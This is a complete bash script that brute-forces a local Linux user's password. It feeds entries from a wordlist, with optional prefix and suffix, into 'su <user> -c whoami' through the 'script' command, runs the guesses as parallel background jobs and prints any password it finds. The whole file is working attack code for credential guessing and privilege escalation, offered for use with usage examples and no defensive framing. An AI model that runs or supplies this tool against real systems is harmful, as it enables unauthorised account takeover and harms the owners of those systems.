#!/bin/bash

# usage
# su_bruteforce.sh <username> <password list> [prefix] [suffix] [max_jobs]
# example: su_bruteforce.sh johndoe customlist.txt Mypass word
# example: su_bruteforce.sh johndoe customlist.txt "" "" 20

set -m
export TOP_PID=$$
trap "trap - SIGTERM && kill -- -$$" INT SIGINT SIGTERM EXIT

username=$1
wordlist=$2
prefix=$3
suffix=$4
max_jobs=${5:-10}

if [ -z "$username" ] || [ -z "$wordlist" ]; then
    echo "Usage: $0 <username> <password list> [prefix] [suffix] [max_jobs]"
    exit 1
fi

if [ ! -f "$wordlist" ]; then
    echo "[-] Wordlist not found: $wordlist"
    exit 1
fi

function progressbar {
    let _progress=(${1}*100/${2}*100)/100
    let _done=(${_progress}*4)/10
    let _left=40-$_done

    _done=$(printf "%${_done}s")
    _left=$(printf "%${_left}s")

    printf "\r[${_done// /#}${_left// /-}] ${_progress}%% (%d/%d)" "$1" "$2"
}

function brute {
    local keyword=$1
    local attempt="${prefix}${keyword}${suffix}"
    local output=$( ( sleep 0.2 && echo "$attempt" ) | script -qc "su $username -c 'whoami'" /dev/null 2>/dev/null)

    if [[ $output != *"Authentication failure"* ]] && echo "$output" | grep -qi "$username"; then
        printf "\n[+] Password Found!\n"
        printf "[+] %s\n" "$attempt"
        kill -9 -$(ps -o pgid= $TOP_PID | grep -o '[0-9]*')
    fi
}

count=$(wc -l < "$wordlist")
current=0

echo "[+] Target   : $username"
echo "[+] Wordlist : $wordlist ($count words)"
echo "[+] Prefix   : '${prefix}'"
echo "[+] Suffix   : '${suffix}'"
echo "[+] Max Jobs : $max_jobs"
echo "[+] Starting bruteforce..."
echo ""

while IFS= read -r line; do
    brute "$line" &

    current=$((current + 1))
    progressbar $current $count

    if (( $(jobs -r | wc -l) >= max_jobs )); then
        wait -n
    fi
done < "$wordlist"

wait
echo ""
echo "[-] Unable to find the password"
